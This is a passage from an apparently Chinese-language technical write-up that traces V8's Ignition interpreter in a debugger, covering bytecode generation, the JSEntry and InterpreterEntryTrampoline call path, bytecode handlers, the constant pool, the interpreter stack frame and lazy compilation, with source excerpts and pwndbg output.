builder()-&gt;StackCheck(info()-&gt;literal()-&gt;start_position());\n\n  // The derived constructor case is handled in VisitCallSuper.\n  if (IsBaseConstructor(function_kind()) &amp;&amp;\n      info()-&gt;literal()-&gt;requires_instance_members_initializer()) &#123;\n    BuildInstanceMemberInitialization(Register::function_closure(),\n                                      builder()-&gt;Receiver());\n  &#125;\n\n  // Visit statements in the function body.\n  VisitStatements(info()-&gt;literal()-&gt;body());\n\n  // Emit an implicit return instruction in case control flow can fall off the\n  // end of the function without an explicit return being present on all paths.\n  if (builder()-&gt;RequiresImplicitReturn()) &#123;\n    builder()-&gt;LoadUndefined();\n    BuildReturn();\n  &#125;\n&#125;\n\n其中的VisitDeclarations用于处理函数中的变量声名，VisitStatements用于处理语句。其中的参数info()-&gt;literal()-&gt;body()是在Parser阶段生成的AST，VisitStatements实际上就是在遍历AST，然后生成对应的字节码。\nvoid BytecodeGenerator::VisitStatements(\n    const ZonePtrList&lt;Statement&gt;* statements) &#123;\n  for (int i = 0; i &lt; statements-&gt;length(); i++) &#123;\n    // Allocate an outer register allocations scope for the statement.\n    RegisterAllocationScope allocation_scope(this);\n    Statement* stmt = statements-&gt;at(i);\n    Visit(stmt);\n    if (builder()-&gt;RemainderOfBlockIsDead()) break;\n  &#125;\n&#125;\n\nFinalizeUnoptimizedCompilationJob当AST遍历结束后，回到GenerateUnoptimizedCodeForToplevel函数，调用FinalizeUnoptimizedCompilationJob完成后续步骤\nCompilationJob::Status FinalizeUnoptimizedCompilationJob(\n    UnoptimizedCompilationJob* job, Handle&lt;SharedFunctionInfo&gt; shared_info,\n    Isolate* isolate) &#123;\n  UnoptimizedCompilationInfo* compilation_info = job-&gt;compilation_info();\n  ParseInfo* parse_info = job-&gt;parse_info();\n\n  SetSharedFunctionFlagsFromLiteral(compilation_info-&gt;literal(), shared_info);\n\n  CompilationJob::Status status = job-&gt;FinalizeJob(shared_info, isolate);\n  if (status == CompilationJob::SUCCEEDED) &#123;\n    InstallUnoptimizedCode(compilation_info, shared_info, parse_info, isolate);\n    CodeEventListener::LogEventsAndTags log_tag;\n    if (parse_info-&gt;is_toplevel()) &#123;\n      log_tag = compilation_info-&gt;is_eval() ? CodeEventListener::EVAL_TAG\n                                            : CodeEventListener::SCRIPT_TAG;\n    &#125; else &#123;\n      log_tag = parse_info-&gt;lazy_compile() ? CodeEventListener::LAZY_COMPILE_TAG\n                                           : CodeEventListener::FUNCTION_TAG;\n    &#125;\n    job-&gt;RecordFunctionCompilation(log_tag, shared_info, isolate);\n    job-&gt;RecordCompilationStats(isolate);\n  &#125;\n  return status;\n&#125;\n\n这里主要是通过InstallUnoptimizedCode将相关信息（字节码等）设置到shared_info中。这样，我们就完成了脚本的编译。\n字节码执行最后返回到d8的bool Shell::ExecuteString时，执行aybe_result = script-&gt;Run(realm);运行字节码。\nMaybeLocal&lt;Value&gt; Script::Run(Local&lt;Context&gt; context) &#123;\n  auto isolate = reinterpret_cast&lt;i::Isolate*&gt;(context-&gt;GetIsolate());\n  TRACE_EVENT_CALL_STATS_SCOPED(isolate, &quot;v8&quot;, &quot;V8.Execute&quot;);\n  ENTER_V8(isolate, context, Script, Run, MaybeLocal&lt;Value&gt;(),\n           InternalEscapableScope);\n  i::HistogramTimerScope execute_timer(isolate-&gt;counters()-&gt;execute(), true);\n  i::AggregatingHistogramTimerScope timer(isolate-&gt;counters()-&gt;compile_lazy());\n  i::TimerEventScope&lt;i::TimerEventExecute&gt; timer_scope(isolate);\n  auto fun = i::Handle&lt;i::JSFunction&gt;::cast(Utils::OpenHandle(this));\n\n  i::Handle&lt;i::Object&gt; receiver = isolate-&gt;global_proxy();\n  Local&lt;Value&gt; result;\n  has_pending_exception = !ToLocal&lt;Value&gt;(\n      i::Execution::Call(isolate, fun, receiver, 0, nullptr), &amp;result);\n\n  RETURN_ON_FAILED_EXECUTION(Value);\n  RETURN_ESCAPED(result);\n&#125;\n\n先是取到脚本对象，我们调试查看一下对象\nauto fun = i::Handle&lt;i::JSFunction&gt;::cast(Utils::OpenHandle(this));\npwndbg&gt; p fun\n$2 = &#123;\n  &lt;v8::internal::HandleBase&gt; = &#123;\n    location_ = 0x55dab8532088\n  &#125;, &lt;No data fields&gt;&#125;\npwndbg&gt; x /20gx 0x55dab8532088\n0x55dab8532088: 0x000022c98b41e9f9  0x000022c98b41e869\n0x55dab8532098: 0x000022c98b41e979  0x000022c98b41e869\n0x55dab85320a8: 0x000022c98b41ea39  0x000022c98b41ea79\n0x55dab85320b8: 0x000022c98b41ea89  0x000022c98b41e739\n0x55dab85320c8: 0x000022c98b401749  0x00001b8cd50805b1\n0x55dab85320d8: 0x1baddead0baddeaf  0x1baddead0baddeaf\n0x55dab85320e8: 0x1baddead0baddeaf  0x1baddead0baddeaf\n0x55dab85320f8: 0x1baddead0baddeaf  0x1baddead0baddeaf\n0x55dab8532108: 0x1baddead0baddeaf  0x1baddead0baddeaf\n0x55dab8532118: 0x1baddead0baddeaf  0x1baddead0baddeaf\npwndbg&gt; job 0x000022c98b41e9f9\n0x22c98b41e9f9: [Function] in OldSpace\n - map: 0x0a2f0d2803b9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]\n - prototype: 0x22c98b401ff1 &lt;JSFunction (sfi = 0x38046d688009)&gt;\n - elements: 0x1b8cd5080c21 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]\n - function prototype: \n - initial_map: \n - shared_info: 0x22c98b41e869 &lt;SharedFunctionInfo&gt;\n - name: 0x1b8cd5080751 &lt;String[#0]: &gt;\n - formal_parameter_count: 0\n - kind: NormalFunction\n - context: 0x22c98b401749 &lt;NativeContext[247]&gt;\n - code: 0x3d3e6a804281 &lt;Code BUILTIN InterpreterEntryTrampoline&gt;\n - interpreted\n - bytecode: 0x22c98b41e979 &lt;BytecodeArray[54]&gt;\n - source code: function fun(x) &#123;\n   var a = 0x666;\n   if (x) &#123;\n      print(&quot;hello&quot;);\n   &#125; else &#123;\n      print(&quot;world&quot;);\n   &#125;\n   return a;\n&#125;\n\nfun(true);\nfun(false);\n%SystemBreak();\n\n\n - properties: 0x1b8cd5080c21 &lt;FixedArray[0]&gt; &#123;\n    #length: 0x38046d6804b9 &lt;AccessorInfo&gt; (const accessor descriptor)\n    #name: 0x38046d680449 &lt;AccessorInfo&gt; (const accessor descriptor)\n    #arguments: 0x38046d680369 &lt;AccessorInfo&gt; (const accessor descriptor)\n    #caller: 0x38046d6803d9 &lt;AccessorInfo&gt; (const accessor descriptor)\n    #prototype: 0x38046d680529 &lt;AccessorInfo&gt; (const accessor descriptor)\n &#125;\n\n - feedback vector: 0x22c98b41ea39: [FeedbackVector] in OldSpace\n - map: 0x1b8cd5080bc1 &lt;Map&gt;\n - length: 3\n - shared function info: 0x22c98b41e869 &lt;SharedFunctionInfo&gt;\n - optimized code/marker: OptimizationMarker::kNone\n - invocation count: 0\n - profiler ticks: 0\n - slot #0 LoadGlobalNotInsideTypeof UNINITIALIZED &#123;\n     [0]: [cleared]\n     [1]: 0x1b8cd5084da9 &lt;Symbol: (uninitialized_symbol)&gt;\n  &#125;\n - slot #2 kCreateClosure  &#123;\n     [2]: 0x22c98b41ea79 &lt;FeedbackCell[no feedback]&gt;\n  &#125;\n\n接下来调用Execution::Call去执行，我们继续跟进,最终来到execution.cc中的V8_WARN_UNUSED_RESULT MaybeHandle&lt;Object&gt; Invoke函数\nIn file: /home/sea/Desktop/v8/src/execution.cc\n   239   Handle&lt;Code&gt; code =\n   240       JSEntry(isolate, params.execution_target, params.is_construct);\n   241   &#123;\n   242     // Save and restore context around invocation and block the\n   243     // allocation of handles without explicit handle scopes.\n ► 244     SaveContext save(isolate);\n   245     SealHandleScope shs(isolate);\n   246 \n   247     if (FLAG_clear_exceptions_on_js_entry) isolate-&gt;clear_pending_exception();\n   248 \n   249     if (params.execution_target == Execution::Target::kCallable) &#123;\n\n这里创建了一个JSEntry对象\npwndbg&gt; p code\n$5 = &#123;\n  &lt;v8::internal::HandleBase&gt; = &#123;\n    location_ = 0x5648828e5e68\n  &#125;, &lt;No data fields&gt;&#125;\npwndbg&gt; x /20gx 0x5648828e5e68\n0x5648828e5e68: 0x000018d75d483bc1  0x000018d75d483c21\n0x5648828e5e78: 0x000018d75d483c81  0x000018d75d483ce1\n0x5648828e5e88: 0x000018d75d483d41  0x000018d75d483da1\n0x5648828e5e98: 0x000018d75d483e01  0x000018d75d483e61\n0x5648828e5ea8: 0x000018d75d483ec1  0x000018d75d483f21\n0x5648828e5eb8: 0x000018d75d483f81  0x000018d75d483fe1\n0x5648828e5ec8: 0x000018d75d484041  0x000018d75d4840a1\n0x5648828e5ed8: 0x000018d75d484101  0x000018d75d484161\n0x5648828e5ee8: 0x000018d75d4841c1  0x000018d75d484221\n0x5648828e5ef8: 0x000018d75d484281  0x000018d75d4842e1\npwndbg&gt; job 0x000018d75d483bc1\n0x18d75d483bc1: [Code]\n - map: 0x1b37e74809e1 &lt;Map&gt;\nkind = BUILTIN\nname = JSEntry\ncompiler = unknown\naddress = 0x7ffcf9e0d580\n\nTrampoline (size = 13)\n0x18d75d483c00     0  49ba80b02ca4af7f0000 REX.W movq r10,0x7fafa42cb080  (JSEntry)\n0x18d75d483c0a     a  41ffe2         jmp r10\n\nInstructions (size = 208)\n0x7fafa42cb080     0  55             push rbp\n0x7fafa42cb081     1  4889e5         REX.W movq rbp,rsp\n0x7fafa42cb084     4  6a02           push 0x2\n0x7fafa42cb086     6  4883ec08       REX.W subq rsp,0x8\n0x7fafa42cb08a     a  4154           push r12\n0x7fafa42cb08c     c  4155           push r13\n0x7fafa42cb08e     e  4156           push r14\n.......................................\n\n接下来将func作为参数传给JSEntry，并执行\nIn file: /home/sea/Desktop/v8/src/execution.cc\n   260       Address orig_func = params.new_target-&gt;ptr();\n   261       Address func = params.target-&gt;ptr();\n   262       Address recv = params.receiver-&gt;ptr();\n   263       Address** argv = reinterpret_cast&lt;Address**&gt;(params.argv);\n   264       RuntimeCallTimerScope timer(isolate, RuntimeCallCounterId::kJS_Execution);\n ► 265       value = Object(stub_entry.Call(isolate-&gt;isolate_data()-&gt;isolate_root(),\n   266                                      orig_func, func, recv, params.argc, argv));\n   267     &#125; else &#123;\n   268       DCHECK_EQ(Execution::Target::kRunMicrotasks, params.execution_target);\n   269 \n   270       // clang-format off\n\n我们单步跟入，接下来会执行Builtins_JSEntryTrampoline\n   0x7fafa42cb0f2 &lt;Builtins_JSEntry+114&gt;    push   0\n   0x7fafa42cb0f4 &lt;Builtins_JSEntry+116&gt;    mov    r10, qword ptr [r13 + 0x2e28]\n   0x7fafa42cb0fb &lt;Builtins_JSEntry+123&gt;    push   qword ptr [r10]\n   0x7fafa42cb0fe &lt;Builtins_JSEntry+126&gt;    mov    r10, qword ptr [r13 + 0x2e28]\n   0x7fafa42cb105 &lt;Builtins_JSEntry+133&gt;    mov    qword ptr [r10], rsp\n ► 0x7fafa42cb108 &lt;Builtins_JSEntry+136&gt;    call   Builtins_JSEntryTrampoline &lt;Builtins_JSEntryTrampoline&gt;\n        rdi: 0x5648828dfec0 —▸ 0x1b37e7480751 ◂— 0x5200001b37e74804\n        rsi: 0x1b37e74804d1 ◂— 0x1b37e74805\n        rdx: 0x19494b71e9f9 ◂— 0x21000025b6b56803\n        rcx: 0x38c735b01521 ◂— 0x21000025b6b5687f\n \n   0x7fafa42cb10d &lt;Builtins_JSEntry+141&gt;    mov    r10, qword ptr [r13 + 0x2e28]\n   0x7fafa42cb114 &lt;Builtins_JSEntry+148&gt;    pop    qword ptr [r10]\n   0x7fafa42cb117 &lt;Builtins_JSEntry+151&gt;    add    rsp, 8\n   0x7fafa42cb11b &lt;Builtins_JSEntry+155&gt;    pop    rbx\n   0x7fafa42cb11c &lt;Builtins_JSEntry+156&gt;    cmp    rbx, 2\n\n继续跟进，最终执行到Builtins_CallFunction_ReceiverIsAny+311时，其中rdi为func对象，这里从对象中取了一个index，并根据index取了一个函数进行调用\n ► 0x7fafa42bbab7 &lt;Builtins_CallFunction_ReceiverIsAny+311&gt;    mov    rcx, qword ptr [rdi + 0x2f]\n   0x7fafa42bbabb &lt;Builtins_CallFunction_ReceiverIsAny+315&gt;    cmp    dword ptr [rcx + 0x3b], -1\n   0x7fafa42bbabf &lt;Builtins_CallFunction_ReceiverIsAny+319&gt;    jne    Builtins_CallFunction_ReceiverIsAny+334 &lt;Builtins_CallFunction_ReceiverIsAny+334&gt;\n    ↓\n   0x7fafa42bbace &lt;Builtins_CallFunction_ReceiverIsAny+334&gt;    mov    ecx, dword ptr [rcx + 0x3b]\n   0x7fafa42bbad1 &lt;Builtins_CallFunction_ReceiverIsAny+337&gt;    mov    rcx, qword ptr [r13 + rcx*8 + 0x2f70]\n   0x7fafa42bbad9 &lt;Builtins_CallFunction_ReceiverIsAny+345&gt;    jmp    rcx\n\n继续执行，可以发现调用的函数是Builtins_InterpreterEntryTrampoline,这个函数正是我们在func对象结构中看到的code处指向的函数\n   0x7fafa42bbab7 &lt;Builtins_CallFunction_ReceiverIsAny+311&gt;    mov    rcx, qword ptr [rdi + 0x2f]\n   0x7fafa42bbabb &lt;Builtins_CallFunction_ReceiverIsAny+315&gt;    cmp    dword ptr [rcx + 0x3b], -1\n   0x7fafa42bbabf &lt;Builtins_CallFunction_ReceiverIsAny+319&gt;    jne    Builtins_CallFunction_ReceiverIsAny+334 &lt;Builtins_CallFunction_ReceiverIsAny+334&gt;\n    ↓\n   0x7fafa42bbace &lt;Builtins_CallFunction_ReceiverIsAny+334&gt;    mov    ecx, dword ptr [rcx + 0x3b]\n   0x7fafa42bbad1 &lt;Builtins_CallFunction_ReceiverIsAny+337&gt;    mov    rcx, qword ptr [r13 + rcx*8 + 0x2f70]\n ► 0x7fafa42bbad9 &lt;Builtins_CallFunction_ReceiverIsAny+345&gt;    jmp    rcx &lt;Builtins_InterpreterEntryTrampoline&gt;\n\n由此可以知道，但执行一个JS函数时，入口函数是code指向的函数，这种特性非常的方便，因为如果要对一个函数进行JIT优化，可以直接将code指向优化后的函数，如果解优化，则再将code改回去即可。甚至还可以进行延迟编译，有时候我们并不需要立即将所有的函数都编译为字节码，在调用的时候再编译也是可以的，将code指向CompileLazy函数即可。我们继续跟踪，看看字节码是如何被解释执行的。Builtins_InterpreterEntryTrampoline主要是做一些初始化工作，然后就进行第一条ByteCode的Handler\n   0x7fafa42d5d2b &lt;Builtins_InterpreterEntryTrampoline+939&gt;    je     Builtins_InterpreterEntryTrampoline+946 &lt;Builtins_InterpreterEntryTrampoline+946&gt;\n    ↓\n   0x7fafa42d5d32 &lt;Builtins_InterpreterEntryTrampoline+946&gt;    mov    rax, qword ptr [r13 - 0x28]\n   0x7fafa42d5d36 &lt;Builtins_InterpreterEntryTrampoline+950&gt;    mov    r15, qword ptr [r13 + 0x1608]\n   0x7fafa42d5d3d &lt;Builtins_InterpreterEntryTrampoline+957&gt;    movzx  r11d, byte ptr [r14 + r9]\n   0x7fafa42d5d42 &lt;Builtins_InterpreterEntryTrampoline+962&gt;    mov    rcx, qword ptr [r15 + r11*8]\n ► 0x7fafa42d5d46 &lt;Builtins_InterpreterEntryTrampoline+966&gt;    call   rcx &lt;Builtins_LdaConstantHandler&gt;\n        rdi: 0x19494b71e9f9 ◂— 0x21000025b6b56803\n        rsi: 0x19494b701749 ◂— 0x1b37e7480f\n        rdx: 0x1b37e74804d1 ◂— 0x1b37e74805\n        rcx: 0x7fafa47ae180 (Builtins_LdaConstantHandler) ◂— lea    rbx, [rip - 7]\n\n每一个bytecode都对应了一个Handler，当进入首个Handler以后，就不再需要主控去调度执行下一个bytecode了，因为每个Handler以自动机的形式实现了在结尾自动执行到下一个bytecode的Handler里，如下所示\n   0x7f0a68ec946e &lt;Builtins_LdaConstantHandler+750&gt;    mov    r15, qword ptr [rbp - 0x20]\n   0x7f0a68ec9472 &lt;Builtins_LdaConstantHandler+754&gt;    mov    rcx, qword ptr [r15 + r8*8]\n   0x7f0a68ec9476 &lt;Builtins_LdaConstantHandler+758&gt;    mov    rbp, qword ptr [rbp]\n   0x7f0a68ec947a &lt;Builtins_LdaConstantHandler+762&gt;    mov    r9, rbx\n   0x7f0a68ec947d &lt;Builtins_LdaConstantHandler+765&gt;    add    rsp, 0x40\n ► 0x7f0a68ec9481 &lt;Builtins_LdaConstantHandler+769&gt;    jmp    rcx &lt;Builtins_LdaZeroHandler&gt;\n    ↓\n   0x7f0a68ec8d80 &lt;Builtins_LdaZeroHandler&gt;            lea    rbx, [rip - 7] &lt;0x7f0a68ec8d80&gt;\n   0x7f0a68ec8d87 &lt;Builtins_LdaZeroHandler+7&gt;          cmp    rbx, rcx\n   0x7f0a68ec8d8a &lt;Builtins_LdaZeroHandler+10&gt;         je     Builtins_LdaZeroHandler+28 &lt;Builtins_LdaZeroHandler+28&gt;\n    ↓\n   0x7f0a68ec8d9c &lt;Builtins_LdaZeroHandler+28&gt;         lea    rbx, [r9 + 1]\n   0x7f0a68ec8da0 &lt;Builtins_LdaZeroHandler+32&gt;         movzx  edx, byte ptr [rbx + r14]\n\n在源码src/interpreter/interpreter-generator.cc中实现了所有字节码的Handler，比如我们上面调试的LdaConstant\n// LdaConstant &lt;idx&gt;\n//\n// Load constant literal at |idx| in the constant pool into the accumulator.\nIGNITION_HANDLER(LdaConstant, InterpreterAssembler) &#123;\n  Node* constant = LoadConstantPoolEntryAtOperandIndex(0);\n  SetAccumulator(constant);\n  Dispatch();\n&#125;\n\n结尾通过Dispatch实现自动执行到下一个bytecode。\n理解字节码&#x2F;虚拟机架构对于如下代码，我们打印一下字节码\nfunction fun(x) &#123;\n   var a = 0x666;\n   if (x) &#123;\n      print(&quot;hello&quot;);\n   &#125; else &#123;\n      print(&quot;world&quot;);\n   &#125;\n   return a;\n&#125;\n\n%DebugPrint(fun);\n%SystemBreak();\nfun(true);\nfun(false);\n\n[generated bytecode for function: ]\nParameter count 1\nRegister count 4\nFrame size 32\n         0x3225d5b9e9da @    0 : 12 00             LdaConstant [0] ;从常量池加载第0个元素\n         0x3225d5b9e9dc @    2 : 26 fa             Star r1 ;存入r1寄存器\n         0x3225d5b9e9de @    4 : 0b                LdaZero ;累加器清零\n         0x3225d5b9e9df @    5 : 26 f9             Star r2 ;存入r2寄存器\n         0x3225d5b9e9e1 @    7 : 27 fe f8          Mov &lt;closure&gt;, r3 \n         0x3225d5b9e9e4 @   10 : 61 2d 01 fa 03    CallRuntime [DeclareGlobals], r1-r3 ;声名fun函数\n    0 E&gt; 0x3225d5b9e9e9 @   15 : a5                StackCheck ;栈检查\n  125 S&gt; 0x3225d5b9e9ea @   16 : 13 01 00          LdaGlobal [1], [0] ;从常量此取出第1个元素作为名称，找到变量，这里找到的是fun函数对象\n         0x3225d5b9e9ed @   19 : 26 fa             Star r1 ；;存入r1\n         0x3225d5b9e9ef @   21 : 61 65 01 fa 01    CallRuntime [DebugPrint], r1-r1\n  143 S&gt; 0x3225d5b9e9f4 @   26 : 61 a7 01 fb 00    CallRuntime [SystemBreak], r0-r0\n  159 S&gt; 0x3225d5b9e9f9 @   31 : 0d                LdaUndefined \n         0x3225d5b9e9fa @   32 : 26 f9             Star r2\n         0x3225d5b9e9fc @   34 : 13 01 00          LdaGlobal [1], [0]\n         0x3225d5b9e9ff @   37 : 26 fa             Star r1\n         0x3225d5b9ea01 @   39 : 10                LdaTrue \n         0x3225d5b9ea02 @   40 : 26 f8             Star r3\n  159 E&gt; 0x3225d5b9ea04 @   42 : 5f fa f9 02       CallNoFeedback r1, r2-r3 调用fun函数\n  170 S&gt; 0x3225d5b9ea08 @   46 : 0d                LdaUndefined \n         0x3225d5b9ea09 @   47 : 26 f9             Star r2\n         0x3225d5b9ea0b @   49 : 13 01 00          LdaGlobal [1], [0]\n         0x3225d5b9ea0e @   52 : 26 fa             Star r1\n         0x3225d5b9ea10 @   54 : 11                LdaFalse \n         0x3225d5b9ea11 @   55 : 26 f8             Star r3\n  170 E&gt; 0x3225d5b9ea13 @   57 : 5f fa f9 02       CallNoFeedback r1, r2-r3 ;调用fun函数\n         0x3225d5b9ea17 @   61 : 26 fb             Star r0\n  201 S&gt; 0x3225d5b9ea19 @   63 : a9                Return \nConstant pool (size = 2)\n0x3225d5b9e959: [FixedArray] in OldSpace\n - map: 0x0fb2739007b1 &lt;Map&gt;\n - length: 2\n           0: 0x3225d5b9e8c1 &lt;FixedArray[4]&gt;\n           1: 0x3225d5b9e7b9 &lt;String[#3]: fun&gt;\nHandler Table (size = 0)\n\n有关字节码的解释，可以在src/interpreter/interpreter-generator.cc文件中查看。从字节码中，我们可以知道，每一个函数都有一个常量池，里面存储着一些常量。这个常量池是在之前分析的字节码生成过程中的FinalizeUnoptimizedCompilationJob函数中，其调用了CompilationJob::Status status = job-&gt;FinalizeJob(shared_info, isolate);,\nInterpreterCompilationJob::Status InterpreterCompilationJob::FinalizeJobImpl(\n    Handle&lt;SharedFunctionInfo&gt; shared_info, Isolate* isolate) &#123;\n  RuntimeCallTimerScope runtimeTimerScope(\n      parse_info()-&gt;runtime_call_stats(),\n      RuntimeCallCounterId::kCompileIgnitionFinalization);\n  TRACE_EVENT0(TRACE_DISABLED_BY_DEFAULT(&quot;v8.compile&quot;),\n               &quot;V8.CompileIgnitionFinalization&quot;);\n\n  Handle&lt;BytecodeArray&gt; bytecodes =\n      generator()-&gt;FinalizeBytecode(isolate, parse_info()-&gt;script());\n  if (generator()-&gt;HasStackOverflow()) &#123;\n    return FAILED;\n  &#125;\n\n  if (ShouldPrintBytecode(shared_info)) &#123;\n    StdoutStream os;\n    std::unique_ptr&lt;char[]&gt; name =\n        compilation_info()-&gt;literal()-&gt;GetDebugName();\n    os &lt;&lt; &quot;[generated bytecode for function: &quot; &lt;&lt; name.get() &lt;&lt; &quot;]&quot;\n       &lt;&lt; std::endl;\n    bytecodes-&gt;Disassemble(os);\n    os &lt;&lt; std::flush;\n  &#125;\n\n  compilation_info()-&gt;SetBytecodeArray(bytecodes);\n  return SUCCEEDED;\n&#125;\n\n其中在FinalizeBytecode中调用了AllocateDeferredConstants生成了常量池\nHandle&lt;BytecodeArray&gt; BytecodeGenerator::FinalizeBytecode(\n    Isolate* isolate, Handle&lt;Script&gt; script) &#123;\n.................\n  AllocateDeferredConstants(isolate, script);\n.................\n\nAllocateDeferredConstants函数如下\nvoid BytecodeGenerator::AllocateDeferredConstants(Isolate* isolate,\n                                                  Handle&lt;Script&gt; script) &#123;\n  // Build global declaration pair arrays.\n  for (GlobalDeclarationsBuilder* globals_builder : global_declarations_) &#123;\n    Handle&lt;FixedArray&gt; declarations =\n        globals_builder-&gt;AllocateDeclarations(info(), script, isolate);\n    if (declarations.is_null()) return SetStackOverflow();\n    builder()-&gt;SetDeferredConstantPoolEntry(\n        globals_builder-&gt;constant_pool_entry(), declarations);\n  &#125;\n\n  // Find or build shared function infos.\n  .....................\n\n  // Find or build shared function infos for the native function templates.\n  .....................\n\n  // Build object literal constant properties\n  .....................\n\n  // Build array literal constant elements\n  .....................\n\n  // Build class literal boilerplates.\n  .....................\n\n  // Build template literals.\n  .....................\n&#125;\n\n现在我们来研究一下虚拟机的栈结构\n                    +-------------------------------------+--------------+\n                    |             ...........             |              |\n                    |                                     |              |\n                    +-------------------------------------+              |\n                    |                 R2                  |              |\n                    |                                     |              |\n                    +-------------------------------------+              |\n                    |                                     |              |\n                    |                 R1                  |              |\n                    +-------------------------------------+              |\n                    |                                     |              |\n                    |                 R0                  |              |\n                    +-------------------------------------+              |\n                    |                                     |              |\n                    |           Bytecode offset           |              |\n                    |                                     |              |\n                    +-------------------------------------+              |\n                    |                                     |              |\n                    |           Bytecode Array            |              |        Callee Frame\n                    |                                     |              +---------------------&gt;\n                    +-------------------------------------+              |\n                    |                                     |              |\n                    |             JSFunction              |              |\n                    |                                     |              |\n                    +-------------------------------------+              |\n                    |              Context                |              |\n        RBP         |                                     |              |\n&lt;---------------------------------------------------------+              |\n                    |                                     |              |\n                    |            Previous BP              |              |\n                    |                                     |              |\n                    +-------------------------------------+              |\n                    |                                     |              |\n                    |           Return Address            |              |\n                    |                                     |              |\n                    +----------------------------------------------------+\n                    |                                     |              |\n                    |             Argument 3              |              |\n                    |                                     |              |\n                    +-------------------------------------+              |\n                    |                                     |              |\n                    |             Argument 2              |              |\n                    |                                     |              |\n                    +-------------------------------------+              |\n                    |                                     |              |\n                    |             Argument 1              |              |      Caller Frame\n                    |                                     |              +-------------------------&gt;\n                    +-------------------------------------+              |\n                    |                                     |              |\n                    |           JSGlobalProxy             |              |\n                    |                                     |              |\n                    +-------------------------------------+              |\n                    |                                     |              |\n                    |             ........                |              |\n                    |                                     |              |\n                    +-------------------------------------+--------------+\n\n如图是v8虚拟机的栈结构，为了实际调试，首先，我们观察到fun函数\nDebugPrint: 0x1ff32561ead1: [Function] in OldSpace\n - map: 0x250f54a803b9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]\n - prototype: 0x1ff325601ff1 &lt;JSFunction (sfi = 0x1a302888009)&gt;\n - elements: 0x08396ef00c21 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]\n - function prototype: \n - initial_map: \n - shared_info: 0x1ff32561e8f1 &lt;SharedFunctionInfo fun&gt;\n - name: 0x1ff32561e7b9 &lt;String[#3]: fun&gt;\n - builtin: CompileLazy\n - formal_parameter_count: 1\n - kind: NormalFunction\n - context: 0x1ff325601749 &lt;NativeContext[247]&gt;\n - code: 0x054bd2f04641 &lt;Code BUILTIN CompileLazy&gt;\n\n它的入口点是BUILTIN CompileLazy，这一点我们前面介绍过，这是延迟编译，因为我们还没有调用到fun函数。当首次调用时，就会进入CompileLazy编译。该函数主要调用了Compiler::Compile(function, Compiler::KEEP_EXCEPTION,                          &amp;is_compiled_scope)\nRUNTIME_FUNCTION(Runtime_CompileLazy) &#123;\n  HandleScope scope(isolate);\n  DCHECK_EQ(1, args.length());\n  CONVERT_ARG_HANDLE_CHECKED(JSFunction, function, 0);\n\n#ifdef DEBUG\n  if (FLAG_trace_lazy &amp;&amp; !function-&gt;shared()-&gt;is_compiled()) &#123;\n    PrintF(&quot;[unoptimized: &quot;);\n    function-&gt;PrintName();\n    PrintF(&quot;]\\n&quot;);\n  &#125;\n#endif\n\n  StackLimitCheck check(isolate);\n  if (check.JsHasOverflowed(kStackSpaceRequiredForCompilation * KB)) &#123;\n    return isolate-&gt;StackOverflow();\n  &#125;\n  IsCompiledScope is_compiled_scope;\n  if (!Compiler::Compile(function, Compiler::KEEP_EXCEPTION,\n                         &amp;is_compiled_scope)) &#123;\n    return ReadOnlyRoots(isolate).exception();\n  &#125;\n  DCHECK(function-&gt;is_compiled());\n  return function-&gt;code();\n&#125;\n\n其中Compiler::Compile(Handle&lt;SharedFunctionInfo&gt; shared_info,                        ClearExceptionFlag flag,                        IsCompiledScope* is_compiled_scope)函数与之前分析的CompileToplevel函数类似，只是在Compile函数中生成AST使用的是ParseAny函数。\nbool ParseAny(ParseInfo* info, Handle&lt;SharedFunctionInfo&gt; shared_info,\n              Isolate* isolate) &#123;\n  DCHECK(!shared_info.is_null());\n  return info-&gt;is_toplevel() ? ParseProgram(info, isolate)\n                             : ParseFunction(info, shared_info, isolate);\n&#125;\n\n由于是函数，因此这里调用的是ParseFunction函数。解析到过程与前面介绍的ParseProgram类似，这里先不叙述。现在我们对第二个CallNoFeedback字节码进行断点（因为第一个会触发CompileLazy进行函数编译），这样我们好观察函数调用的过程。对于字节码的断点调试，我们可以使用硬件读断点。\n         0x98299ea11 @   55 : 26 f8             Star r3\n  170 E&gt; 0x98299ea13 @   57 : 5f fa f9 02       CallNoFeedback r1, r2-r3\n         0x98299ea17 @   61 : 26 fb             Star r0\n  201 S&gt; 0x98299ea19 @   63 : a9                Return \npwndbg&gt; rwatch *0x98299ea13\nHardware read watchpoint 4: *0x98299ea13\n\n继续运行即可来到对应的Handler\n ► 0x7f04a304fe32 &lt;Builtins_StarHandler+50&gt;              movabs r10, 0x100000000\n   0x7f04a304fe3c &lt;Builtins_StarHandler+60&gt;              cmp    r10, rbx\n   0x7f04a304fe3f &lt;Builtins_StarHandler+63&gt;              jae    Builtins_StarHandler+78 &lt;Builtins_StarHandler+78&gt;\n    ↓\n   0x7f04a304fe4e &lt;Builtins_StarHandler+78&gt;              mov    rcx, qword ptr [r15 + rbx*8]\n   0x7f04a304fe52 &lt;Builtins_StarHandler+82&gt;              jmp    rcx\n    ↓\n   0x7f04a307b840 &lt;Builtins_CallNoFeedbackHandler&gt;       lea    rbx, [rip - 7] &lt;0x7f04a307b840&gt;\n   0x7f04a307b847 &lt;Builtins_CallNoFeedbackHandler+7&gt;     cmp    rbx, rcx\n   0x7f04a307b84a &lt;Builtins_CallNoFeedbackHandler+10&gt;    je     Builtins_CallNoFeedbackHandler+28 &lt;Builtins_CallNoFeedbackHandler+28&gt;\n    ↓\n   0x7f04a307b85c &lt;Builtins_CallNoFeedbackHandler+28&gt;    mov    rdx, rbp\n   0x7f04a307b85f &lt;Builtins_CallNoFeedbackHandler+31&gt;    mov    dword ptr [rdx - 0x20], 0\n   0x7f04a307b866 &lt;Builtins_CallNoFeedbackHandler+38&gt;    mov    dword ptr [rdx - 0x1c], r9d\n\n这里取到了字节码的操作数\n..................\n RCX  0xfffffffffffffffa\n..................\n R8   0x2\n..................\n   0x7f04a307b85f &lt;Builtins_CallNoFeedbackHandler+31&gt;    mov    dword ptr [rdx - 0x20], 0\n   0x7f04a307b866 &lt;Builtins_CallNoFeedbackHandler+38&gt;    mov    dword ptr [rdx - 0x1c], r9d\n   0x7f04a307b86a &lt;Builtins_CallNoFeedbackHandler+42&gt;    movsx  rcx, byte ptr [r14 + r9 + 1]\n   0x7f04a307b870 